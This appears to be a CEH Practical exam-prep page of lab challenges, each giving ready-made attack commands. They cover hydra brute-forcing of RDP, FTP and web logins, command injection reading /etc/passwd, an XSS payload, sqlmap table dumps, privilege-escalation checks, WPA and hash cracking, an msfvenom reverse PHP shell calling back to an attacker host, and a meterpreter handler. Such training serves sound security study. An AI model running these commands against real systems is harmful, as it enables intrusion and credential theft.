Module A — Reconnaissance & Enumeration

Pattern 01 — Find live hosts

Question: Which hosts in the authorized /28 training subnet respond to discovery?

Input: authorized subnet (e.g. 192.168.56.0/28)

ip -br addr
nmap -sn 192.168.56.0/28 -oN evidence/hosts.txt
Show answer

Record only responsive host addresses; discovery can be blocked by firewalls. Example: 192.168.56.10

Pattern 02 — Identify open ports

Question: Find the open TCP ports on a lab host.

Input: authorized VM at 192.168.56.10

nmap -sT -p 21,22,80,443 192.168.56.10
nmap -sT -p- 192.168.56.10 -oN evidence/ports.txt
Show answer

Report TCP/UDP accurately; filtered != open. Example: 22, 80

Exam-Style Challenges (Original)

Advanced Patterns

Original practice challenges inspired by CEH Practical exam structure. Different targets and values from the actual exam. Tests the same skills and tools.

RDP Credential Cracking [Medium · 15min]

Scenario: A Windows machine on the 10.10.50.0/24 subnet has RDP enabled. Crack the password for user 'jsmith' and read the file secret.txt on the desktop. Tools: hydra, xfreerdp.

hydra -l jsmith -P /usr/share/wordlists/rockyou.txt rdp://10.10.50.10
xfreerdp /u:jsmith /p:password123 /v:10.10.50.10
Show answer / approach

Practice: use hydra with -t 4 (threads) and -V (verbose). Answer format: the password string.

Privilege Escalation (Linux) [Hard · 25min]

Scenario: SSH into a Linux box as user 'dev' (password: dev123). Escalate to root and read /root/flag.txt. Check sudo -l, SUID binaries, and cron jobs.

ssh dev@10.10.50.20
sudo -l
find / -perm -4000 2>/dev/null
linpeas.sh
Show answer / approach

Practice: look for sudo NOPASSWD, SUID on /usr/bin/find or /usr/bin/vim, writable cron scripts. Answer: contents of /root/flag.txt.

Image Steganography [Easy · 10min]

Scenario: An image file 'vacation.jpg' contains hidden data. Extract it using steghide with password 'sunshine'.

steghide extract -sf vacation.jpg -p sunshine
# or: stegseek vacation.jpg /usr/share/wordlists/rockyou.txt
Show answer / approach

Practice: steghide info vacation.jpg first (shows if data is embedded). Answer: the extracted text/file.

ELF Binary Analysis [Medium · 15min]

Scenario: Analyze the ELF binary 'suspicious_elf' and find the PT_LOAD(0) segment size. Use readelf or objdump.

file suspicious_elf
readelf -l suspicious_elf | grep -A2 'LOAD'
# or: objdump -x suspicious_elf | grep -i load
Show answer / approach

Practice: readelf -l shows program headers. PT_LOAD(0) is the first LOAD segment. Size is in hex (e.g., 0x000c54ec).

Command Injection [Medium · 15min]

Scenario: A web app at http://10.10.50.30/cmd.php accepts a 'host' parameter. Test for OS command injection and list the /etc/passwd file.

curl 'http://10.10.50.30/cmd.php?host=127.0.0.1;cat+/etc/passwd'
# or: ; id ; whoami ; ls
Show answer / approach

Practice: try ; | && || and URL-encoded versions (%3B). Answer: number of user accounts or specific username.

XSS Detection [Easy · 10min]

Scenario: Test http://10.10.50.30/search.php?q=test for reflected XSS. Submit a payload and check if it executes.

curl 'http://10.10.50.30/search.php?q=<script>alert(1)</script>'
# Check if payload appears unescaped in response
Show answer / approach

Practice: look for the payload reflected in the HTML without encoding. Answer: Yes/No (vulnerable or not).

SQL Injection - Data Extraction [Hard · 25min]

Scenario: SQLi on http://10.10.50.30/login.php. Login as 'admin' and extract all usernames from the 'users' table.

sqlmap -u 'http://10.10.50.30/login.php' --data='user=admin&pass=test' --dbs
sqlmap -u 'http://10.10.50.30/login.php' --data='user=admin&pass=test' -D dbname --tables
sqlmap -u 'http://10.10.50.30/login.php' --data='user=admin&pass=test' -D dbname -T users --dump
Show answer / approach

Practice: use --batch for non-interactive. Answer: number of users or specific username/password.

Parameter Tampering (IDOR) [Easy · 10min]

Scenario: On http://10.10.50.30/profile.php?id=1001, change the id parameter to access other users' profiles. Find the profile for id=1003.

curl 'http://10.10.50.30/profile.php?id=1003'
# or use Burp Suite to modify the request
Show answer / approach

Practice: try sequential IDs (1001, 1002, 1003). Answer: the username/email for id 1003.

Brute Force Web Login [Medium · 20min]

Scenario: Brute force the login at http://10.10.50.30/login.php for user 'admin' using a wordlist.

hydra -l admin -P ~/ctf/wordlists/rockyou.txt 10.10.50.30 http-post-form '/login.php:user=^USER^&pass=^PASS^:Invalid'
Show answer / approach

Practice: adjust the failure string ('Invalid', 'Wrong', 'Login failed'). Answer: the cracked password.

Banner Grabbing [Easy · 5min]

Scenario: Grab the HTTP banner from http://10.10.50.30 and identify the server version and ETag.

curl -I http://10.10.50.30
echo -e 'HEAD / HTTP/1.0\r\n\r\n' | nc 10.10.50.30 80
Show answer / approach

Practice: look for Server: and ETag: headers. Answer: server version string + ETag value.

CMS Identification [Easy · 10min]

Scenario: Identify the CMS used by http://10.10.50.30. Check for WordPress, Joomla, Drupal indicators.

whatweb http://10.10.50.30
curl -s http://10.10.50.30 | grep -i 'wp-content\|joomla\|drupal'
# or: wpscan --url http://10.10.50.30
Show answer / approach

Practice: check /wp-login.php, /administrator/, /user/login. Answer: CMS name (e.g., WordPress).

FTP Credential Cracking [Medium · 15min]

Scenario: An FTP server at 10.10.50.30 has weak credentials. Crack them and download flag.txt.

hydra -l ftpuser -P ~/ctf/wordlists/rockyou.txt ftp://10.10.50.30
ftp 10.10.50.30  # login with cracked creds
# get flag.txt
Show answer / approach

Practice: try anonymous login first (ftp anonymous). Answer: contents of flag.txt.

Clickjacking Detection [Easy · 5min]

Scenario: Test if http://10.10.50.30 is vulnerable to clickjacking by checking X-Frame-Options.

curl -I http://10.10.50.30 | grep -i 'x-frame-options\|content-security-policy'
# Absence = vulnerable
Show answer / approach

Practice: if no X-Frame-Options or CSP frame-ancestors → vulnerable. Answer: Yes/No.

Session Hijacking / ARP [Medium · 15min]

Scenario: Analyze sniffsession.pcap to identify the protocol used for sniffing (ARP poisoning).

tshark -r sniffsession.pcap -Y 'arp' -T fields -e arp.src.proto_ipv4 -e arp.dst.proto_ipv4
tshark -r sniffsession.pcap -Y 'arp.duplicate-address-detected'
Show answer / approach

Practice: look for gratuitous ARP or duplicate IP. Answer: ARP (or the sniffing protocol name).

DVWA File Upload [Hard · 25min]

Scenario: Upload a PHP web shell to DVWA at http://10.10.50.30/DVWA. Execute it to read /etc/passwd.

msfvenom -p php/reverse_php LHOST=YOUR_IP LPORT=4444 -f raw > shell.php
# Upload via DVWA file upload form, then access /hackable/uploads/shell.php
Show answer / approach

Practice: DVWA security level must be 'low'. Use a simple PHP shell. Answer: command output.

DVWA MD5 Hash Crack [Easy · 10min]

Scenario: A file Hash.txt uploaded to DVWA contains an MD5 hash. Crack it to reveal the original message.

curl http://10.10.50.30/DVWA/hackable/uploads/Hash.txt
echo 'HASH_HERE' | xargs -I{} john --format=raw-md5 --wordlist=rockyou.txt --stdin
Show answer / approach

Practice: or use online hash lookup. Answer: the cracked plaintext.

DDoS PCAP Analysis [Hard · 20min]

Scenario: Analyze Evil-traffic.pcapng to find the least IPv4 packet count sent to victim 172.22.10.10 and the attacker IP.

tshark -r Evil-traffic.pcapng -Y 'ip.dst==172.22.10.10' -T fields -e ip.src | sort | uniq -c | sort -n
tshark -r Evil-traffic.pcapng -Y 'ip.dst==172.22.10.10' | wc -l
Show answer / approach

Practice: sort by count, the least is the attacker (or the most is the flood). Answer: packet count + attacker IP.

VeraCrypt Volume Crack [Hard · 25min]

Scenario: A VeraCrypt volume 'Its_File' is password-protected. The password hash is in Hash2crack.txt. Crack it, mount the volume, and find the secret code in EC_data.txt.

john --format=raw-md5 --wordlist=rockyou.txt Hash2crack.txt
veracrypt -t -k '' --pim=0 --protect-hidden=no Its_File /mnt/vc
# read /mnt/vc/EC_data.txt
Show answer / approach

Practice: crack the hash first, then use the password to mount. Answer: the secret code from EC_data.txt.

WiFi WPA Cracking [Medium · 15min]

Scenario: Crack the WPA2 password from W!F!_Pcap.cap using aircrack-ng. Report the password length.

aircrack-ng -w ~/ctf/wordlists/rockyou.txt W!F!_Pcap.cap
# or: aircrack-ng -w rockyou.txt -b BSSID W!F!_Pcap.cap
Show answer / approach

Practice: need a handshake in the capture. Answer: the password string and its length.

RAT Remote Access [Hard · 30min]

Scenario: A Windows machine on 10.10.55.0/24 has a RAT installed. Use it to access the 'Scan' folder and count the files inside.

msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
# After session: meterpreter> ls C:\\Users\\Admin\\Documents\\Scan\
Show answer / approach

Practice: Metasploit meterpreter. Use 'ls' or 'dir' to count files. Answer: file count (e.g., 5).

IoT MQTT PCAP Analysis [Medium · 15min]

Scenario: Analyze IoT network traffic pcap to find the MQTT publish message topic and its length.

tshark -r iot_traffic.pcap -Y 'mqtt' -T fields -e mqtt.topic -e mqtt.msg
# or: tshark -r iot_traffic.pcap -Y 'mqtt.msgtype==3' -T fields -e mqtt.topic
Show answer / approach

Practice: MQTT publish is message type 3. Answer: topic name + length.

Load Balancer Identification [Easy · 10min]
